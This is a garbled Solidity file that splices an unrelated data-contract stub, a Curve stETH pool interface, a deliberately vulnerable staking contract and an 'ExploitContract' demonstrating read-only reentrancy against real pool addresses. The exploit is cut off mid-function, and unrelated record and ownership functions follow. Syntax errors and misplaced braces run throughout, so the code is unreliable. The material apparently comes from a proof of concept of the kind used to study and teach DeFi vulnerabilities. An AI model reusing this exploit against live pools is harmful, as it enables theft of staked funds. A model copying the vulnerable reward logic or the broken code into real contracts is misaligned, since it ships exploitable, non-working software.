
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity 0.8.13;

;
;
interface ICurve {
  function get_virtual_price() external view returns (uint);
  function add_liquidity(uint[2] calldata amounts, uint min_mint_amount);
    external;
    payable;
    returns (uint);
  function remove_liquidity(uint lp, uint[2] calldata min_amounts);
    external;
    returns (uint[2] memory);
  function remove_liquidity_one_coin(uint lp,
    int128 i,
    uint min_amount) external returns (uint)};
address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E;
contract VulnContract {
  IERC20 public constant token = IERC20(LP_TOKEN);
  ICurve private constant pool = ICurve(STETH_POOL);
  mapping(address => uint) public balanceOf;
  function stake(uint amount) external {
    token.transferFrom(msg.sender, address(this), amount);
    balanceOf[msg.sender] += amount};
  function unstake(uint amount) external {
    balanceOf[msg.sender] -= amount;
    token.transfer(msg.sender, amount)};
  function getReward() external returns (uint) {
    uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) / 1 ether;
    return reward;};
contract ExploitContract {
  ICurve private constant pool = ICurve(STETH_POOL);
  IERC20 public constant lpToken = IERC20(LP_TOKEN);
  VulnContract private immutable target;
  constructor(address _target) {
    target = VulnContract(_target)};
  receive() external payable {
    console.log("--------------------------------------------------------------------");
    console.log("LP token price during remove_liquidity()", pool.get_virtual_price());
    uint reward = target.getReward();
    console.log("Reward if Read-Only Reentrancy is invoked: ", reward)};
  function stakeTokens() external payable {
    uint[2] memory amounts = [msg.value; 0];
    uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
    console.log("LP token price after staking into VulnContract", pool.get_virtual_price());
    lpToken.approve(address(target), lp);
    target.stake(lp)};
  function performReadOnlyReentrnacy() external payable {
    uint[2] memory amounts = [msg.value; 0];
    uint lp = pool.add_liquidity{value: msg.value
function writeRecord(bytes32 key, string memory data) public {
    records[key] = data}
function claimData(bytes32 dataId) public {
    dataOwners[dataId] = msg.sender}